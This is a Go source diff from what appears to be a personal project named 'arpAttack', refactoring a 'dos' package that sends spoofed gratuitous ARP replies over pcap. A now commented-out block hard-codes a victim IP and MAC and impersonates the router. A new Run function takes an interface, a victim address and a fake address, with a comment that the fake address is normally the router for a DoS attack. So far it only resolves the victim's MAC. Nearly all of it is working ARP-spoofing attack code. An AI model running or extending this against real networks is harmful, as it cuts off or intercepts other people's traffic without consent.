@@ -1,7 +1,6 @@
 package dos
 
 import (
-	"bytes"
 	"encoding/binary"
 	"errors"
 	"fmt"
@@ -12,6 +11,7 @@ import (
 	"github.com/google/gopacket"
 	"github.com/google/gopacket/layers"
 	"github.com/google/gopacket/pcap"
+	"github.com/rogercoll/arpAttack/internal/pkg/utils"
 )
 
 func ARPGratuitous(handler *pcap.Handle, iface *net.Interface, DstHwAddress, Daddr, Saddr []byte) error {
@@ -103,65 +103,6 @@ func writeARP(handler *pcap.Handle, iface *net.Interface, addr *net.IPNet) error
 	return nil
 }
 
-// readARP loops until 'stop' is closed. Handles incoming ARP responses
-func readARP(handler *pcap.Handle, iface *net.Interface, stop chan struct{}) {
-	src := gopacket.NewPacketSource(handler, layers.LayerTypeEthernet)
-	in := src.Packets()
-	for {
-		var packet gopacket.Packet
-		select {
-		case <-stop:
-			return
-		case packet = <-in:
-			arpLayer := packet.Layer(layers.LayerTypeARP)
-			if arpLayer == nil {
-				continue
-			}
-			arp := arpLayer.(*layers.ARP)
-			if arp.Operation != layers.ARPReply || bytes.Equal([]byte(iface.HardwareAddr), arp.SourceHwAddress) {
-				// This is a packet I sent.
-				continue
-			}
-			log.Printf("IP %v is at %v", net.IP(arp.SourceProtAddress), net.HardwareAddr(arp.SourceHwAddress))
-		}
-	}
-}
-
-func scan(iface *net.Interface) error {
-	if addr, err := getValidAddress(iface); err != nil {
-		return nil
-	} else {
-		log.Printf("Using network range %v for interface %v", addr, iface.Name)
-
-		//pcap => packet capturer
-		/*
-			In networking terms, a computer having its network interface card set to “promiscuous mode”
-			receives all packets on the same network segment.
-			In “normal mode,” a network card accepts only packets addressed to its MAC Address.
-		*/
-		handler, err := pcap.OpenLive(iface.Name, 65536, true, pcap.BlockForever)
-		if err != nil {
-			return err
-		}
-		defer handler.Close()
-
-		stop := make(chan struct{})
-		go readARP(handler, iface, stop)
-		defer close(stop)
-
-		for {
-			if err := writeARP(handler, iface, addr); err != nil {
-				log.Printf("error writing packets on %v: %v", iface.Name, err)
-				return err
-			}
-			//10 seconds should be more than enough to recive a response
-			time.Sleep(10 * time.Second)
-		}
-	}
-
-	return nil
-}
-
 func getValidAddress(iface *net.Interface) (*net.IPNet, error) {
 	var faddr *net.IPNet //final address
 	if addrs, err := iface.Addrs(); err != nil {
@@ -204,66 +145,124 @@ func getInterfaces() ([]net.Interface, error) {
 
 func Ole() {
 	/*
-		var wg sync.WaitGroup
+			var wg sync.WaitGroup
+			ifaces, err := getInterfaces()
+			if err != nil {
+				log.Fatal(err)
+			}
+
+			for _, iface := range ifaces {
+				fmt.Printf("%+v\n", iface)
+				wg.Add(1)
+				go func(iface net.Interface) {
+					defer wg.Done()
+					if err := scan(&iface); err != nil {
+						log.Printf("Interface %s error: %v", iface.Name, err)
+					}
+				}(iface)
+			}
+			wg.Wait()
+
 		ifaces, err := getInterfaces()
 		if err != nil {
 			log.Fatal(err)
 		}
-
 		for _, iface := range ifaces {
-			fmt.Printf("%+v\n", iface)
-			wg.Add(1)
-			go func(iface net.Interface) {
-				defer wg.Done()
-				if err := scan(&iface); err != nil {
-					log.Printf("Interface %s error: %v", iface.Name, err)
+			if iface.Name == "wlp58s0" {
+				addr, err := getValidAddress(&iface)
+				if err != nil {
+					log.Fatal(err)
 				}
-			}(iface)
+				fmt.Printf("%+v", addr.IP)
+				fmt.Println([]byte(addr.IP))
+				handler, err := pcap.OpenLive(iface.Name, 65536, true, pcap.BlockForever)
+				if err != nil {
+					log.Fatal(err)
+				}
+				defer handler.Close()
+
+				stop := make(chan struct{})
+				go readARP(handler, &iface, stop)
+				defer close(stop)
+
+				dstHard, err := net.ParseMAC("b8:27:eb:bb:bd:54")
+				if err != nil {
+					log.Fatal(err)
+				}
+				dstAddr := net.IPv4(192, 168, 1, 69)
+				dstAddr = dstAddr.To4()
+				sAddr := net.IPv4(192, 168, 1, 1)
+				sAddr = sAddr.To4()
+
+				if err := ARPGratuitous(handler, &iface, dstHard, []byte(dstAddr), []byte(sAddr)); err != nil {
+					log.Printf("error writing arp reply packets on %v: %v", iface.Name, err)
+					log.Fatal(err)
+				}
+				//10 seconds should be more than enough to recive a response
+				time.Sleep(20 * time.Second)
+			}
 		}
-		wg.Wait()
 	*/
-	ifaces, err := getInterfaces()
+}
+
+func getInterface(ifaceName string) (*net.Interface, error) {
+	ifaces, err := net.Interfaces()
 	if err != nil {
-		log.Fatal(err)
+		return nil, err
 	}
 	for _, iface := range ifaces {
-		if iface.Name == "wlp58s0" {
-			addr, err := getValidAddress(&iface)
-			if err != nil {
-				log.Fatal(err)
-			}
-			fmt.Printf("%+v", addr.IP)
-			fmt.Println([]byte(addr.IP))
-			handler, err := pcap.OpenLive(iface.Name, 65536, true, pcap.BlockForever)
-			if err != nil {
-				log.Fatal(err)
-			}
-			defer handler.Close()
-
-			stop := make(chan struct{})
-			go readARP(handler, &iface, stop)
-			defer close(stop)
-
-			dstHard, err := net.ParseMAC("b8:27:eb:bb:bd:54")
-			if err != nil {
-				log.Fatal(err)
-			}
-			dstAddr := net.IPv4(192, 168, 1, 69)
-			dstAddr = dstAddr.To4()
-			sAddr := net.IPv4(192, 168, 1, 1)
-			sAddr = sAddr.To4()
-
-			if err := ARPGratuitous(handler, &iface, dstHard, []byte(dstAddr), []byte(sAddr)); err != nil {
-				log.Printf("error writing arp reply packets on %v: %v", iface.Name, err)
-				log.Fatal(err)
-			}
-			//10 seconds should be more than enough to recive a response
-			time.Sleep(20 * time.Second)
+		if iface.Name == ifaceName {
+			return &iface, nil
 		}
+	}
+	return nil, fmt.Errorf("Interface %s not found", ifaceName)
+}
+
+func getDstMACAddr(iface *net.Interface, handle *pcap.Handle, dstAddr string) ([]byte, error) {
+	stop := make(chan struct{})
+	addresses := make(chan []byte)
+	go utils.ReadARP(handle, iface, addresses, stop)
+	defer close(stop)
+	defer close(addresses)
+	select {
+	case dstMACAddr := <-addresses:
+		return dstMACAddr, nil
+	case <-time.After(time.Second * 30):
+		fmt.Println("Time out: No MAC address found for the victim address")
+		return []byte{}, nil
 	}
 }
 
-func Run() error {
+func Run(ifaceName string, dstAddr, fakeAddr string) error {
+	//Normally to perform a DoS attack fakeAddr should be the router address
+	//Address format => 192.168.1.1
 	fmt.Println("Dos attack running")
+	fmt.Println(ifaceName)
+	fmt.Println(dstAddr)
+	fmt.Println(fakeAddr)
+
+	iface, err := getInterface(ifaceName)
+	if err != nil {
+		return err
+	}
+
+	addr, err := getValidAddress(iface)
+	if err != nil {
+		log.Fatal(err)
+	}
+	fmt.Printf("%+v\n", addr.IP)
+
+	handle, err := pcap.OpenLive(iface.Name, 65536, true, pcap.BlockForever)
+	if err != nil {
+		return err
+	}
+	defer handle.Close()
+
+	dstMACAddr, err := getDstMACAddr(iface, handle, dstAddr)
+	if err != nil {
+		return err
+	}
+	fmt.Println(dstMACAddr)
+
 	return nil
 }
